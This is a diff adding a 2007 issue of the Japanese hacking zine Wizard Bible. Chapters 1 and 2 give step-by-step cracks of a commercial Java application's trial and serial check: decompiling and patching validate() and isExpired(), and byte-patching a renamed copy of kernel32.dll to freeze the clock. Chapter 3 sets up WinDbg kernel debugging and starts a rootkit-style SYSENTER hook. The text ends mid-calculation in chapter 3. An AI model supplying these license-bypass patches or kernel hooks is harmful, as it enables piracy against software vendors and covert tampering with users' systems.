@@ -1,0 +1,2467 @@
+[-]=======================================================================[-]
+
+                      Wizard Bible vol.36 (2007,9,19)
+
+[-]=======================================================================[-]
+
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+  ---- 第0章：目次 ---
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+○第1章: マニアックJavaプログラミング第7回: ～Javaクラッキング～ 金床 著
+
+○第2章: Windowsシステムプログラミング 番外編 ～Java～     Kenji Aiko 著
+
+○第3章: Windowsシステムプログラミング Part2 ～デバッグ～  Kenji Aiko 著
+
+○第4章: リバースエンジニアリング実践 khallengeへのチャレンジ その1
+                                                          Green boy 4 著
+
+○第5章: リバースエンジニアリング実践 khallengeへのチャレンジ その2
+                                                          Green boy 4 著
+
+○第6章: はじめてのハッキング ～バッファオーバフローの利用～  Defolos 著
+
+○第7章: 基礎暗号学講座・第11回 ～原始元判定アルゴリズム～   IPUSIRON 著
+
+○第8章: お知らせ
+
+○第9章: 著者プロフィール
+
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+--- 第1章: マニアックJavaプログラミング第7回: ～ Javaクラッキング ～ ---
+
+著者：金床
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+
+■0x01.) はじめに
+
+　Javaアプリケーションは一般的にクラックに弱いとされているが、本当にそう
+なのだろうか。この事実を確かめるべく、実際に製品として販売されているJava
+アプリケーションをひとつ選び、シリアルクラックを試みることとした。本記事
+は技術的な側面にのみ焦点を当てるものであるため、製品の名前は明かさない。
+仮にHoge社のFugaSoftwareというソフトウェアとしておこう。
+
+
+■0x02.) 概要
+
+　今回ターゲットとするFugaSoftwareは、GUIのアプリケーションである。Javaの
+GUIのソフトウェアといえばSwingを使用するのが一般的だが、FugaSoftwareはSWT
+を使っている。これはEclipseでよく知られるようになった、OSネイティブのルッ
+ク&フィールを実現できるテクノロジーだ。
+
+　FugaSoftwareには試用期限がもうけられており、その期間を過ぎるとシリアル
+ナンバーの入力を促すダイアログが出現するようになる。ここで正しいシリアル
+ナンバーを入力できなければ、アプリケーションの使用を続けることができなく
+なってしまう。
+
+
+■0x03.) 対策なし
+
+　OSの時計を進めた状態で起動すると、「期限が切れた」というダイアログが出
+現するが、もう一度OSの時計を元に戻す（試用期限内に設定する）と、何もなか
+ったかのように起動してくれる。つまり時計をいじるだけで使い続けることがで
+きるため、現実的にはクラック対策は行われていないといえるだろう。はっきり
+いってクラックする意味がまったくないということだが、今回はリバースエンジ
+ニアリングそのものが目的であるため、もう少し突っ込んで調べてみることとす
+る。
+
+
+■0x04.) 祭り開始
+
+　シリアルクラックの際にまず調べるべき点は、長いアプリケーションのコード
+の中の「どこ」でシリアルナンバーの検証が行われているのかということである。
+今回はJavaアプリケーションであるため、javaコマンドのオプションであるXrun
+hprofを使うことにする。このオプションを指定してアプリケーションを実行する
+と、終了後にアプリケーションの動作をすべてトレースした情報がjava.hprof.t
+xtというファイルに記録される。たとえばTestというクラスのアプリケーション
+を実行する場合、次のように起動すればよい。
+
+-----
+> java -Xrunhprof Test
+-----
+
+　今回ターゲットとするFugaSoftwareはユーザが.exeファイルをクリックするこ
+とでWindowsネイティブのアプリケーションが起動し、そのアプリケーションがさ
+らにjavaコマンドを利用して本体を起動する、という仕組みになっている。その
+ためjavaコマンドの引数を指定する方法を探す必要がある。
+
+　幸いにしてこれはすぐに見つかった。FugaSoftware.iniという設定ファイルの
+内容が次のようになっていたのだ。
+
+-----
+-vmargs
+-Xms128M
+-Xmx512M
+-XX:MinHeapFreeRatio=20
+-----
+
+　このファイル中にオプションを指定しておけば、javaコマンドにそれが渡され
+るという仕組みである。そこで、このファイルを次のように書き換える。
+
+-----
+-vmargs
+-Xms128M
+-Xmx512M
+-Xrunhprof
+-XX:MinHeapFreeRatio=20
+-----
+
+　この状態で、時計を進めてわざと期限切れの日時に設定し、FugaSoftwareを起
+動する。「期限が切れている」というダイアログが出現するので、何度かわざと
+間違っているシリアルナンバーを入力する。そしてアプリケーションを終了する。
+するとjava.hprof.txtが生成される。このファイルは膨大な情報が記録されるた
+めサイズは大きくなりがちだが、今回はアプリケーションが大規模であることも
+あり、なんと57MBという大きさになってしまった。
+
+
+■0x05.) 野生のカンを研ぎ澄ます
+
+　java.hprof.txtには次のようなトレースログが大量に並んでいる。
+
+-----
+TRACE 2191:
+	java.lang.Class.newInstance0(<Unknown>:Unknown line)
+	java.lang.Class.newInstance(<Unknown>:Unknown line)
+	org.eclipse.osgi.framework.internal.protocol.StreamHandlerFactory.createURLStreamHandler(StreamHandlerFactory.java:126)
+	java.net.URL.getURLStreamHandler(<Unknown>:Unknown line)
+-----
+
+　このように「どのクラスのどのメソッドがよばれたのか」がすべて記録されて
+いるので、この中からシリアルナンバーの内容を検証していそうなものを探すの
+だ。何しろ膨大な量なので、さすがに1つ1つ読んでいくわけにはいかない。その
+ため、何かそれらしい単語で検索をかけていく方法を採ることになる（仮に関数
+名をAやBのように難読可しておけば、この方法に対する対策となる）。
+
+　いくつかの単語で検索した結果、「valid」という単語で以下のトレースを発見
+した。
+
+-----
+TRACE 25030:
+	java.util.regex.Pattern.compile(<Unknown>:Unknown line)
+	java.lang.String.replaceAll(<Unknown>:Unknown line)
+	com.hoge.fugasoftware.ui.asn.ActivationDialog$InputValidator.isValid(ActivationDialog.java:72)
+	com.hoge.fugasoftware.editors.derived.ui.FugaInputDialog.validateInput(FugaInputDialog.java:257)
+-----
+
+　「ActivationDialog」や「isValid」という単語から、いかにも怪しいことがわ
+かる。そこで、次にこのActivationDialogというクラスを逆コンパイルして中身
+を確かめてみることにする。
+
+　Javaアプリケーションでは大量のクラスファイルが使われるが、それらは普通
+jarファイルにまとめて格納されている。FugaSoftwareでも例外ではなく、plugi
+nディレクトリ以下に大量のjarファイルが存在する。このうちどのjarファイルに
+ActiveDialogクラスが格納されているのかを調べる必要がある。幸いにもこのク
+ラスのパッケージ名である「com.hoge.fugasoftware.ui.asn」と殆ど同じ名前の
+「\plugins\com.hoge.fugasoftware.ui_2.0.147081」というディレクトリがあり、
+その中のui.jarに格納されていることがわかった。ちなみにjarファイルの中身を
+見るにはjarコマンドの-tオプションを使って次のようにすればよい。
+
+-----
+>jar -t < ui.jar
+-----
+
+　jarファイルはzipファイルと同じ形式であるため、unzipコマンドの-lオプショ
+ンを使って中身を見ることもできる。
+
+　jarファイルの中身を展開するにはjarコマンドの-xオプションを使う。もちろ
+んunzipも使うことができる。
+
+-----
+>jar -x < ui.jar
+-----
+
+
+■0x06.) 逆コンパイル
+
+　ui.jar中にActivationDialogクラスがあることはわかったので、jadというよく
+知られた逆コンパイルツールを使ってソースコード形式へと変換する。すると問
+題の関数は次のようになっていることがわかった。
+
+-----
+    public String isValid(String newText)
+    {
+        newText = newText.replaceAll("-", "");
+        boolean valid = ASNBridge.getDefault().validate(FugaProduct.HOGESOFTWARE, newText);
+        ActivationDialog.access$0(ActivationDialog.this, 0).setEnabled(valid);
+        if(valid)
+        {
+            ActivationDialog.access$1(ActivationDialog.this).setImage(UIPlugin.getDefault().getImageRegistry().get("check"));
+            ActivationDialog.access$1(ActivationDialog.this).setVisible(true);
+            ActivationDialog.access$2(ActivationDialog.this).setEnabled(false);
+        } else
+        {
+            ActivationDialog.access$1(ActivationDialog.this).setImage(UIPlugin.getDefault().getImageRegistry().get("yield"));
+            ActivationDialog.access$1(ActivationDialog.this).setVisible(true);
+        }
+        return valid ? Messages.getString("ActivationDialog.2") : Messages.getString("ActivationDialog.3");
+    }
+-----
+
+　この関数が常にtrueを返すようにしてもよさそうだが、どうやらシリアルナン
+バーの評価自体はこのクラスではなく、2行目にある「ASNBridge.getDefault().
+validate」という関数で行われているようだ。そこで、ASNBridgeクラスの内容を
+見てみることにする。
+
+　先ほどと同じようにパッケージ名を手がかりにjarファイルを探す。今回もすぐ
+に見つかり、目的のjarファイルは「plugins\com.hoge.fugasoftware.project_2
+.0.147081\zornproject.jar」であることがわかる。
+
+　jadを使ってASNBridgeクラスのソースコードを生成する。するとvalidate関数
+の中身は次のようになっていた。
+
+-----
+    public boolean validate(FugaProduct fugaproduct, String s)
+    {
+        return ((AbstractFugaLicenseServiceImpl)fImpl.get(fugaproduct)).installLicense(s);
+    }
+-----
+
+　実に正直な関数だ。正しければtrueを、間違っていればfalseを返すようである。
+関数名や変数名から何をやっているのかがすべてわかってしまう点などからも、
+まったくクラッキング対策がされていないことがわかる。この関数が常にtrueを
+返すよう、次のようにソースコードを書き換える。
+
+-----
+    public boolean validate(FugaProduct fugaproduct, String s)
+    {
+    return true;
+        //return ((AbstractFugaLicenseServiceImpl)fImpl.get(fugaproduct)).installLicense(s);
+    }
+-----
+
+　また、同じクラスに「期限切れかどうか」を判定している関数を見つけたので、
+ついでにそちらも書き換えてしまう。
+
+-----
+    public boolean isExpired(FugaProduct fugaproduct)
+    {
+    return false;
+        //return ((AbstractFugaLicenseServiceImpl)fImpl.get(fugaproduct)).isExpired();
+    }
+-----
+
+　こちらは常にfalseを返すようにする。
+
+　ソースコードを書き換えたらコマンドラインからコンパイルする。幸いこのク
+ラスは他のパッケージへの依存が低いため、簡単にコンパイルが通る。
+
+-----
+>javac  com/hoge/fugasoftware/project/asn/ASNBridge.java 
+-----
+
+　次に再びjarファイルに格納する
+
+-----
+>jar -cf zornproject.jar com/
+-----
+
+　そしてこのjarファイルを「plugins\com.hoge.fugasoftware.project_2.0.147
+081\zornproject.jar」に上書きする。
+
+　この状態で起動すると、見事に期限切れのダイアログが出現しなくなる。クラ
+ック完了である。
+
+
+■0x07.) まとめ
+
+　Javaアプリケーションのリバースエンジニアリングは初めてであったが、ここ
+までわずか1時間弱しかかからなかった。筆者がJavaやEclipseに親しんでいるの
+が役に立ったようだ。もしJavaアプリケーションでクラック対策を行おうと思う
+ならば、まずは変数名や関数名をわかりにくいものにするのがよさそうである。
+
+
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+--- 第2章: Windowsシステムプログラミング 番外編 ～Java～ ---
+
+著者：Kenji Aiko
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+
+■0x01.) はじめに
+
+　Javaアプリケーションは、VM上で動作するというその性質上、デコンパイル（
+実行ファイルからソースコードに復元すること）を容易に行える。そのため、ク
+ラック行為に対して、それほど強固ではないと言われている。
+　今回は、この事実を確かめるために、実際に製品として販売、配布されている
+Javaアプリケーションを例にシリアルクラックを行った。ただし、製品名を出す
+わけにはいかないため、このテキストでは、伏せさせていただくことにする。
+
+
+■0x02.) 概要
+
+　このソフトウェアには使用期限があり、それを過ぎると、シリアルナンバーを
+入力しなければアプリケーションを使用できなくなる。よって、このアプリケー
+ションをクラックするには、次の2つのいずれかの方法が必要となる。
+
+（1）シリアルナンバーを特定する
+（2）時間制限を解除する
+
+　どちらでもよいが、大抵は、やりやすい簡単な方法を選ぶことになる。ただし、
+どちらが簡単かは、実際にやってみなければ分からないため、とりあえずは両方
+に焦点を当てて進めていく。
+
+
+■0x03.) OllyDbg
+
+　プログラムをOllyDbg上で起動させ、適当にステップを進めていくと、ある場所
+から、OllyDbg内の処理に関わらず、プログラムが進み始めることが確認できる。
+つまり、別のプロセスが生成され、それが起動しているわけだ。この事実から、
+内部でCreateProcess関数が呼び出されていると想像できる。
+　少し詳細に処理を追っていくと、CreateProcessが呼ばれている場所が見つかる。
+
+-----  OllyDbg
+00402B9B  |. 52             PUSH EDX
+00402B9C  |. 6A 00          PUSH 0
+00402B9E  |. FF15 14004100  CALL DWORD PTR DS:[<&KERNEL32.CreateProccessW>]
+00402BA4  |. 85C0           TEST EAX,EAX
+-----
+
+　ここで、CreateProcessに渡されている引数を確認すると、どうやらJavaVM（j
+avaw）が起動しているようだ。
+　つまり、このプログラムはあくまでも起動時のみ実行されるだけのもので、本
+物のアプリケーションとなるメインのプログラムは、Javaで記述されており、Cr
+eateProcessで別プロセスとして動くわけだ。
+
+
+■0x04.) シリアルナンバーの認証
+
+　CreateProcessで起動した新しいプロセス（javaw）は、ウィンドウが表示され
+ると、最初に、シリアルナンバーを要求してくる。ここで、現在の日時を取得し、
+もし指定の期間を過ぎていたら、アプリケーションを使わせないようになってい
+る。
+　試しにWindowsの時間を少し進めて、再度プログラムを起動すると、指定の時間
+が過ぎたことになり、アプリケーションが使えなくなる。逆に時間を戻すと、ま
+たアプリケーションが使えるようになる。
+　つまり、このアプリケーションの認証は、Windowsの時間に従っている。
+　ということは、時間取得系のAPIにブレイクポイントを仕掛ければ、何かヒント
+が得られるかもしれない。時間取得系のAPIを探す。
+
+・GetSystemTime
+・GetLocalTime
+・GetSystemTimeAsFileTime
+
+　これらの関数にブレイクポイントを仕掛ける。
+
+
+■0x05.) JavaVM
+
+　実行ファイルはただの飾りであり、内部で新たなプロセスが生成されている。
+そして、そのプロセスはJavaVMであり、それが起動した状態で、様々なウィンド
+ウが生成されていく。つまり、事実上の本体はJavaで作られている。
+　タスクマネージャーでプロセスを確認すると、javawの起動が確認できる。「本
+体はこっちか！」というわけで、起動中のjavawにOllyDbgでアタッチする。そし
+て、時間取得系のAPI群にブレイクポイントを仕掛ける。すると、いい感じにブレ
+イクポイントに引っかかる。
+
+-----  OllyDbg
+080ACC4A   50            PUSH EAX
+080ACC4B   FF15 68600E08 CALL DWORD PTR DS:[<&KERNEL32.GetSystemTimeAsFileTime>
+080ACC51   FF75 FC       PUSH DWORD PTR SS:[EBP-4]
+-----
+
+　GetSystemTimeAsFileTime関数が時間取得に利用されていることが分かる。ただ
+し、Javaのコードが直接APIを呼び出しているとは考えにくい。おそらく、このA
+PIは、JavaVMによって呼び出されているはずだ。呼び出し元のモジュール名を確
+認すると、jvmとなっている。そして、このモジュールはjvm.dllとして存在する。
+
+
+■0x06.) jvm.dll
+
+　問題箇所は特定できた。あとはバイナリレベルで変更を加えればOKだ。
+　jvm.dllはkernel32.dllをインポートしている。そして、kernle32.dllはGetSy
+stemTimeAsFileTimeをエクスポートしている。よって、まずは、jvm.dllをバイナ
+リエディタで開き、KERNEL32.dllの箇所をLERNEL32.dllに変更する。
+　続いて、C:\WINDOWS\system32以下からkernel32.dllをコピーしてきて、バイナ
+リエディタで開き、GetSystemTimeAsFileTime関数を都合のよいように書きかえる。
+
+-----  kernel32.dll（変更前:GetSystemTimeAsFileTime関数）
+00000BE0                 8B FF 55 8B EC A1 18 00 FE 7F 8B 
+00000BF0  15 14 00 FE 7F 3B 05 1C 00 FE 7F 75 ED 8B 4D 08 
+00000C00  89 11 89 41 04 5D C2 04 00 90 90 90 90 90
+-----
+
+-----  kernel32.dll（変更前:GetSystemTimeAsFileTime関数）
+008717E5 >/$ 8BFF           MOV EDI,EDI
+008717E7  |. 55             PUSH EBP
+008717E8  |. 8BEC           MOV EBP,ESP
+008717EA  |> A1 1800FE7F    /MOV EAX,DWORD PTR DS:[7FFE0018]
+008717EF  |. 8B15 1400FE7F  |MOV EDX,DWORD PTR DS:[7FFE0014]
+008717F5  |. 3B05 1C00FE7F  |CMP EAX,DWORD PTR DS:[7FFE001C]
+008717FB  |.^75 ED          \JNZ SHORT lernel32.008717EA
+008717FD  |. 8B4D 08        MOV ECX,DWORD PTR SS:[EBP+8]
+00871800  |. 8911           MOV DWORD PTR DS:[ECX],EDX
+00871802  |. 8941 04        MOV DWORD PTR DS:[ECX+4],EAX
+00871805  |. 5D             POP EBP
+00871806  \. C2 0400        RETN 4
+-----
+
+　GetSystemTimeAsFileTime関数は、引数の構造体（8バイト）に、100ns（ナノセ
+カンド）単位の時間を入れる。上記のバイナリを見て分かるとおり、EAXレジスタ
+に上位4バイト、EDXレジスタに下位4バイトが入る。100nsが1なので、1秒は1000
+0000、60秒は600000000（0x23C34600）となる。
+
+-----  kernel32.dll（変更後:GetSystemTimeAsFileTime関数）
+00000BE0                 8B FF 55 8B EC A1 18 00 FE 7F 8B 
+00000BF0  15 14 00 FE 7F 3B 05 1C 00 FE 7F 75 ED 8B 4D 08 
+00000C00  89 11 B8 E2 FA C7 01 89 41 04 5D C2 04 00 
+-----
+
+-----  kernel32.dll（変更後:GetSystemTimeAsFileTime関数）
+008717E5 >/$ 8BFF           MOV EDI,EDI
+008717E7  |. 55             PUSH EBP
+008717E8  |. 8BEC           MOV EBP,ESP
+008717EA  |> A1 1800FE7F    /MOV EAX,DWORD PTR DS:[7FFE0018]
+008717EF  |. 8B15 1400FE7F  |MOV EDX,DWORD PTR DS:[7FFE0014]
+008717F5  |. 3B05 1C00FE7F  |CMP EAX,DWORD PTR DS:[7FFE001C]
+008717FB  |.^75 ED          \JNZ SHORT lernel32.008717EA
+008717FD  |. 8B4D 08        MOV ECX,DWORD PTR SS:[EBP+8]
+00871800  |. 8911           MOV DWORD PTR DS:[ECX],EDX
+00871802  |. B8 E2FAC701    MOV EAX,1C7FAE2
+00871807  |. 8941 04        MOV DWORD PTR DS:[ECX+4],EAX
+0087180A  |. 5D             POP EBP
+0087180B  \. C2 0400        RETN 4
+-----
+
+　変更方法は様々だが、今回はシンプルに、上位4バイトを固定値とした。これ
+で、時間は進まなくなる。よって、いつまでも期限切れにならない。
+　最後に、このファイルのファイル名をlernel32.dllとする。これで完了だ。
+　jvm.dllはこの変更されたlernel32.dllを読み出し、このlernel32.dllがエクス
+ポートしているGetSystemTimeAsFileTime関数を呼び出す。しかし、このGetSyst
+emTimeAsFileTime関数は、上位4バイトが固定のため時間が進まない。つまり、永
+遠に期限が切れないということになる。これでクラックは成功となる。
+
+
+■0x07.) さいごに
+
+　今回、偶然にも、金床さんと同じソフトウェアを解析（クラック）したらしく、
+しかも、それぞれがまったく異なる方法でそれを成功させていたことから、遅れ
+ながらも、WB vol36に本テキストを追加させてもらった。
+　解析ひとつとっても様々なアプローチがあり、とても面白いと思う。機会があ
+ればぜひともチャレンジしてみてはどうだろうか。
+
+
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+--- 第3章: Windowsシステムプログラミング Part2　～デバッグ～ ---
+
+著者：Kenji Aiko
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+
+■0x01.) はじめに
+
+　このテキストは、Windowsシステムに関するプログラミングを中心に記述してい
+る。WinDbgの導入、カーネルランドのデバッグ、SYSENTERの解析などを中心に解
+説している。
+
+
+■0x02.) WinDbgの導入
+
+　カーネルランドで動作するプログラムをデバッグするには、カーネルモードデ
+バッガが必要となる。Windows環境でのカーネルモードデバッガは、SoftICEとWi
+nDbgが有名だが、SoftICEは販売停止となったため、このテキストでは、WinDbgを
+使うことにする。
+　まず、実行用と解析用で、マシンを2台と、それらを繋ぐシリアルクロスケーブ
+ルを用意する。
+
+シリアルクロスケーブル（↓こういうの）
+http://www.sanwa.co.jp/product/syohin.asp?code=KR-LK3
+
+（1） マシンを2台用意する（実行用と解析用）
+（2） シリアルクロスケーブルで2台のマシンを繋ぐ（COM1使用）
+（3） 実行用マシンに適当なOSをインストール（自分はWinXPSP2使用）
+（4） 実行用マシンにインストールされているOSの「C:\boot.ini」を開く
+
+-----  コマンドプロンプト
+C:\> attrib -r -s -h boot.ini
+C:\> notepad boot.ini
+-----
+
+-----  boot.ini（変更前）
+1: [boot loader]
+2: timeout=30
+3: default=multi(0)disk(0)rdisk(0)partition(1)\WINDOWS
+4: [operation system]
+5: multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="（省略）" /fastdetect
+-----
+
+（5） boot.iniの最後に1行追加（以下は2行になっているが、実際は1行とする）
+
+-----  boot.ini（変更後）
+1: [boot loader]
+2: timeout=30
+3: default=multi(0)disk(0)rdisk(0)partition(1)\WINDOWS
+4: [operation system]
+5: multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="（省略）" /fastdetect
+6: multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="（省略）" /fastdetect
+6:  /debug /debugport=com1 /baudrate=115200
+-----
+
+（6） boot.ini保存（これで実行用マシンの設定終了）
+（7） 解析用マシンにWinDbgをインストール、WinDbgを起動
+
+　ここで、WinDbgにシンボルのパスを設定しておく。まず、「c:\tmp」というフ
+ォルダを作成。WinDbgのメニューから「File」→「Symbol File Path」を開く。
+そして、「Symbol Path」の入力欄に「srv*c:\tmp*http://msdl.microsoft.com/
+download/symbols」を設定する。
+　これらの設定は、WinDbgの起動には直接影響しないが、やっておくと後々便利。
+
+（8） メニューから「File」→「Kernel Debug」→「COM」を表示
+（9） Baud Rateを115200、Portをcom1、Reconnectにチェック、で「OK」
+
+　これでWinDbgが待ち状態に入る。実行用マシンを再起動すると、OSの選択画面
+が表示される。boot.iniの設定により「debugger enabled」モードで起動可能に
+なる。「debugger enabled」モードで起動すると、解析用マシンのWinDbgが反応
+する。
+　待ち状態だったWinDbgが反応し、次のような文字列が表示される。
+
+-----  WinDbg
+Microsoft (R) Windows Debugger  Version 6.6.0007.5
+Copyright (c) Microsoft Corporation. All rights reserved.
+
+Opened \\.\com1
+Waiting to reconnect...
+Connected to Windows XP 2600 x86 compatible target, ptr64 FALSE
+Kernel Debugger connection established.
+Symbol search path is: srv*c:\tmp*http://msdl.microsoft.com/download/symbols
+Executable search path is: 
+Windows XP Kernel Version 2600 UP Free x86 compatible
+Built by: 2600.xpsp_sp2_rtm.040803-2158
+Kernel base = 0x804d9000 PsLoadedModuleList = 0x8055cb20
+-----
+
+　使い方を始めとした、コマンドのヘルプは、「?」を入力すれば分かる。WinDb
+gのメニューから「Debug」→「Break」で実行用OSを止めて、以下のコマンドを入
+力。
+
+-----  WinDbg
+kd> ?
+
+Open debugger.chm for complete debugger documentation
+
+B[C|D|E][<bps>] - clear/disable/enable breakpoint(s)
+BL - list breakpoints
+BA <access> <size> <addr> - set processor breakpoint
+BP <address> - set soft breakpoint
+D[type][<range>] - dump memory
+DT [-n|y] [[mod!]name] [[-n|y]fields]
+   [address] [-l list] [-a[]|c|i|o|r[#]|v] - dump using type information
+DV [<name>] - dump local variables
+E[type] <address> [<values>] - enter memory values
+G[H|N] [=<address> [<address>...]] - go
+K <count> - stacktrace
+…
+（省略）
+…
+-----
+
+　これでWinDbgの導入は完了。
+
+
+■0x03.) APIからカーネルへの道
+
+　kernel32.dllやuser32.dllが提供している通常のAPI群とは違い、カーネル側で
+動作するAPI群をエクスポートしているのが、 ntdll.dllである。そして、API呼
+び出しに伴って、ユーザーランドからカーネル側に処理が移る過程は、「Applic
+ation」→ 「kernel32.dll」→「ntdll.dll」→「KERNEL」となる。
+　ntdll.dllがエクスポートしているZwCreateFile関数の呼び出し構造は以下。
+
+-----  ntdll.dll（ZwCreateFile呼び出し）
+7C94D682 >/$ B8 25000000    MOV EAX,25
+7C94D687  |. BA 0003FE7F    MOV EDX,7FFE0300
+7C94D68C  |. FF12           CALL DWORD PTR DS:[EDX]
+7C94D68E  \. C2 2C00        RETN 2C
+-----
+
+　7FFE0300にあるデータは「8B EB 94 7C」なので、7C94EB8Bへ飛ぶ。
+
+-----  ntdll.dll（7C94D68CのCALLの先）
+7C94EB8B >/$ 8BD4           MOV EDX,ESP
+7C94EB8D  |. 0F34           SYSENTER
+-----
+
+　eaxレジスタが、システムコールテーブルの関数呼び出し番号（識別番号）。
+ただし、Windowsのバージョンによって変わる可能性アリ。また、 WindowsNT/20
+00では「int 0x2e」を使うが、WindowsXP/2003（x86系）では、sysenter命令を使
+用する。
+　SYSENTERが実行された時点で、処理がカーネルへ移る。SYSENTERについては、
+「int 2E/sysenter/syscall考察」より、以下の処理が走る。
+
+int 2E/sysenter/syscall考察
+http://www.marbacka.net/asm64/arkiv/int2e_sysenter_syscall.html
+
+-----　sysenter実行時の処理内容
+（1）CSレジスタにSYSENTER_CS_MSR(MSR-174H)の値をロード
+（2）EIPレジスタにSYSENTER_EIP_MSR(MSR-176H)の値をロード
+（3）SSレジスタにSYSENTER_CS_MSRの値に8を加算した値をロード
+（4）ESPレジスタにSYSENTER_ESP_MSR(MSR-175H)の値をロード
+（5）特権レベル0に切り替えて、カーネルモードルーチンの実行を開始
+-----
+
+　要するに、スタックには積まず、それぞれのレジスタにMSRの値を入れて、カー
+ネルモードへ入っているだけだ。MSRの値は、WinDbgで確認できる。WinDbgのメニ
+ューから「Debug」→「Break」で実行用OSを止めて、以下のコマンドを入力。
+
+-----  WinDbg
+msr[174] = 00000000`00000008
+kd> rdmsr 175
+msr[175] = 00000000`f9e73000
+kd> rdmsr 176
+msr[176] = 00000000`804e0f6f
+-----
+
+　EIPレジスタに入れられる値（SYSENTER_EIP_MSR）は804e0f6fであることが分か
+る。よって、このアドレスのコードを出力する。
+
+-----  WinDbg
+kd> u 804e0f6f
+nt!KiFastCallEntry:
+804e0f6f b923000000      mov     ecx,23h
+804e0f74 6a30            push    30h
+804e0f76 0fa1            pop     fs
+804e0f78 8ed9            mov     ds,cx
+804e0f7a 8ec1            mov     es,cx
+804e0f7c 8b0d40f0dfff    mov     ecx,dword ptr ds:[0FFDFF040h]
+804e0f82 8b6104          mov     esp,dword ptr [ecx+4]
+804e0f85 6a23            push    23h
+-----
+
+　これがSYSENTERが呼ばれたときのカーネル側の処理となる。
+
+
+■0x04.) SYSENTERフック
+
+　WinDbgを利用して、SYSENTERをフックする。SYSENTERによるEIPの変更は、MSR
+を参照して行われるため、MSRの値をあらかじめ変更しておくことで、SYSENTERの
+フックが可能となる。
+　まずは、自身のコードを入れるための領域をカーネル空間に確保する。次のド
+ライバを作成する。
+
+----  rk_empty.c
+#include <ntddk.h>
+
+VOID OnUnload(IN PDRIVER_OBJECT pDriverObject)
+{
+    DbgPrint("rk_empty: OnUnload called.\n");
+}
+
+NTSTATUS DriverEntry(IN PDRIVER_OBJECT pDriverObject, 
+                     IN PUNICODE_STRING theRegistryPath)
+{
+    __asm {
+        nop
+        nop
+        nop
+        nop
+        nop
+        nop
+    }
+    DbgPrint("rk_empty: DriverEntry = %08x\n", (ULONG)DriverEntry);
+    pDriverObject->DriverUnload = OnUnload;
+    return STATUS_SUCCESS;
+}
+-----
+
+　DriverEntryに適当な数のNOPを入れた。このドライバをインストールすると、
+DriverEntryのアドレスがWinDbgに表示される。
+
+-----  WinDbg
+rk_empty: DriverEntry = fa10f4d4
+-----
+
+　このアドレス以降のどこかに、NOPが6バイト連続している領域があるはずなの
+で、逆アセンブルして探す。
+
+-----  WinDbg
+kd> u fa10f4d4
+rk_empty!DriverEntry [c:\winddk\rootkit\rk_empty\rk_empty.c @ 11]:
+fa10f4d4 8bff            mov     edi,edi
+fa10f4d6 55              push    ebp
+fa10f4d7 8bec            mov     ebp,esp
+fa10f4d9 90              nop
+fa10f4da 90              nop
+fa10f4db 90              nop
+fa10f4dc 90              nop
+fa10f4dd 90              nop
+-----
+
+　アドレスfa10f4d9以降には、NOPが6バイトあるため、ここに任意のコードを入
+れられる。
+
+-----  WinDbg
+kd> rdmsr 176
+msr[176] = 00000000`804e0f6f
+-----
+
+　現在のSYSENTERのジャンプ先は804e0f6fとなっている。これがオリジナルアド
+レスであるため、fa10f4d9以降の6バイトに、「JMP 804e0f6f」という命令を追加
+する。WinDbgのメニューから「View」→「Memory」でメモリの状態が参照できる。
+ここに「fa10f4d4」と入力すれば、fa10f4d4以降のメモリの状態が表示される。
+
+-----  WinDbg（Memory）
+fa10f4d4  8b ff 55 8b ec 90 90 90 90 90 90 68 d4 f4 10 fa 68 b0
+fa10f4e6  f4 10 fa e8 18 00 00 00 8b 45 08 59 c7 40 34 a2 f4 10
+fa10f4f8  fa 59 33 c0 5d c2 08 00 cc cc cc cc cc cc ff 25 84 f5
+..........
+-----
+
+　6バイトのNOPがある先頭アドレスfa10f4d9から、804e0f6fへジャンプする命令
+なので、記述するマシン語は
+
+-----
+100000000 - ((fa10f4d9 - 804e0f6f) + 5) = 863d1a91
+-----
+
